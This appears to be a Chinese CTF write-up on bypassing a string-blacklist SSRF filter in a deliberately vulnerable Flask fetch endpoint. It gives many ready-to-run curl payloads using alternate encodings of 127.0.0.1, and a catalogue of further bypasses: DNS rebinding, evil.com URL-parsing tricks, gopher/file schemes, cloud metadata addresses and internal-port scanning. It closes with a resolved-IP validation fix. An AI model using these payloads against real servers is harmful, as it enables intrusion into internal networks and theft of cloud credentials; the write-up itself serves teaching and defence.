## 题目背景

### Note

BLOCKED = {'127.0.0.1', 'localhost', '0.0.0.0', '::1'}

@app.route('/fetch')
def fetch():
    url = request.args.get('url', '')
    host = urlparse(url).hostname        # 只取 hostname 字符串
    if host and host.lower() in BLOCKED: # 字符串精确比较
        return jsonify(ok=False, msg=f'blocked host: {host}'), 403
    r = requests.get(url, timeout=3)
    return f'<h3>HTTP {r.status_code}</h3><pre>{r.text[:4096]}</pre>'

## 为什么字符串黑名单必败——IP 地址有 N 种等价表示法：

[代码块边界]text
all equivalent to 127.0.0.1:
127.0.0.1            <- 黑名单命中
127.1                <- shorthand, socket 自动展开为 127.0.0.1
127.0.1              <- 也是 shorthand
2130706433           <- 十进制整数 (127·256^3 + 1)
0x7f000001           <- 十六进制整数
0x7f.0x0.0x0.0x1     <- 四段十六进制
0177.0.0.1           <- 八进制（首位 0 触发八进制解析）
017700000001         <- 纯八进制
[::ffff:127.0.0.1]   <- IPv4-mapped IPv6
[::ffff:7f00:1]      <- IPv4-mapped IPv6 十六进制
127.0.0.1.nip.io     <- DNS wildcard 服务
localhost.me         <- 公开 DNS 记录解析到 127.0.0.1
127.0.0.1.xip.io     <- 同 nip.io
[代码块边界]

底层机制：Python `socket.inet_aton()` / `getaddrinfo()` 会按照 BSD socket 的 IPv4 相关解析规则 把上述所有变体都解析为 `127.0.0.1`。但字符串黑名单只看字面，这就是本题的攻击面。

## 更高级的绕过技巧：

1. **DNS Rebinding（TOCTOU）：** 第一次解析返回公网 IP（过检查），第二次解析返回 127.0.0.1（触发 SSRF）。服务：`rebind.network`、`rbndr.us`
2. **Redirect 绕过：** 自己控制的 server 返回 302 `Location: http://127.0.0.1/...`，若后端跟随 redirect 没重校验就中招
3. **URL 解析差异：** `http://evil.com@127.0.0.1` / `http://127.0.0.1#evil.com` / `http://127.0.0.1?x=evil.com`
4. **字符编码：** `http://%31%32%37.0.0.1` / `http://⓪⓪⓪.0.0.1`（Unicode 全角）/ IDN 变体
5. **非 HTTP 协议：** `gopher://` / `dict://` / `file://` / `ftp://` / `ldap://`
6. **IPv6 Zone ID：** `http://[fe80::1%25eth0]/` 有些过滤器挂
7. **双解码：** `http://127.0.0.1%252f@evil.com/`（先 decode 成 `%2f`，再当路径）

## Payload 逐字节解析

[代码块边界]text
攻击请求:
GET /fetch?url=http://127.1/internal/flag HTTP/1.1
Host: 192.168.1.100:32822


            ↑
        └─ 外层 URL（浏览器访问目标服务）

        服务端解析 request.args['url']:

        ┌──────────────────────────┐
        │http://127.1/internal/flag│
        └──────────────────────────┘
                ↓ urlparse().hostname
                "127.1"
                ↓ 字符串黑名单检查
        "127.1" in {"127.0.0.1","localhost","0.0.0.0","::1"}
                ↓
        False → 放行
                ↓ requests.get("http://127.1/internal/flag")
                ↓ Python socket 解析
        "127.1" → struct in_addr { 0x7f000001 } = 127.0.0.1
                ↓ 建立 TCP 连接到本地 80 端口
        GET /internal/flag
                ↓ 服务端 remote_addr = 127.0.0.1
        放行返回 flag
[代码块边界]

# 1. 短格式
curl "$B/fetch?url=http://127.1/internal/flag"
curl "$B/fetch?url=http://127.0.1/internal/flag"

# 2. 同网段任意地址
curl "$B/fetch?url=http://127.0.0.2/internal/flag"
curl "$B/fetch?url=http://127.255.255.254/internal/flag"

# 3. 进制转换
curl "$B/fetch?url=http://2130706433/internal/flag"        # decimal
curl "$B/fetch?url=http://0x7f000001/internal/flag"        # hex
curl "$B/fetch?url=http://0x7f.0.0.1/internal/flag"        # hex 四段
curl "$B/fetch?url=http://0177.0.0.1/internal/flag"        # octal
curl "$B/fetch?url=http://017700000001/internal/flag"      # 全 octal

# 4. IPv6 mapped
curl "$B/fetch?url=http://[::ffff:127.0.0.1]/internal/flag"
curl "$B/fetch?url=http://[::ffff:7f00:1]/internal/flag"
curl "$B/fetch?url=http://[0:0:0:0:0:ffff:127.0.0.1]/internal/flag"

| `127.1` 被 curl 参数直接解释本地发送 | zsh/bash 对 `!` 特殊 | 用双引号包 URL |
| `[::ffff:127.0.0.1]` zsh 报 no matches | `[ ]` 被 glob | 加引号 or `setopt nonomatch` |
| Python requests 支持但目标 Go 服务不支持 | Go `net.ParseIP` 比较严格 | 改用 `127.1` 变体 |
| `@` 后面 host 解析被服务器当 userinfo | 标准 URL 里 `user:pass@host` | 确认 parse 后 hostname 取哪段 |
| DNS Rebinding 偶发失败 | DNS 缓存 TTL | 选 `rbndr.us` TTL=0 的服务 |
| 响应只有 4KB 被截断 | 服务端 `r.text[:4096]` | 目标接口返回短 flag 没问题；大文件要 Range |
| 内部端口探测超时 3s | `requests.get(timeout=3)` | 并发批量扫 |
| 302 跟随回公网 | requests 默认 `allow_redirects=True` | 攻击时可以借力 / Redirect 绕过 |

## SSRF 绕过 10 谱

Important

1. IPv4 等价表示法【本题】：short / decimal / hex / octal / mixed
2. IPv6 形式：`[::1]` / `[::ffff:127.0.0.1]` / zone id
3. DNS 魔法服务：`nip.io` / `sslip.io` / `localtest.me`
4. DNS Rebinding【TOCTOU】：`rbndr.us`，双 A 记录轮询
5. URL 解析差异：`@` / `#` / `?` / 双斜杠
6. 字符编码：URL encode / 双编码 / Unicode
7. Redirect 绕过：自建 302 重定向器
8. 协议切换：file / gopher / dict / ldap / ftp
9. PaaS 元数据：AWS 169.254.169.254 / GCP / Azure
10. 内部服务横跳：K8s API / Docker sock / Redis / Consul / etcd

## 关键修复

Important

修一【核心银弹】：基于解析后的 IP 段判断，不用字符串黑名单

[代码块边界]python
import ipaddress, socket
from urllib.parse import urlparse

def resolve_and_check(url):
    p = urlparse(url)
    if p.scheme not in ('http', 'https'):
        raise ValueError('only http/https')
    if p.hostname is None:
        raise ValueError('no host')

    # 1. 解析到所有 IP（IPv4 + IPv6）
    infos = socket.getaddrinfo(p.hostname, p.port or 80, proto=socket.IPPROTO_TCP)
    ips = [ipaddress.ip_address(info[4][0]) for info in infos]

    # 2. 每个 IP 都要过检查（防 DNS 多 A 记录）
    for ip in ips:
        if (ip.is_loopback or ip.is_private or ip.is_link_local or
            ip.is_reserved or ip.is_multicast or ip.is_unspecified):
            raise ValueError(f'blocked: {ip} is internal')

    return ips[0], p.port or 80

# 方案 A：用 "pinning socket"——解析一次后把 IP 锁定，直接用 IP 发请求
ip, port = resolve_and_check(url)

class SafeAdapter(HTTPAdapter):
    def get_connection(self, url, proxies=None):
        ip, port = resolve_and_check(url)
        return super().get_connection(url_replace_host(url, str(ip)), proxies)
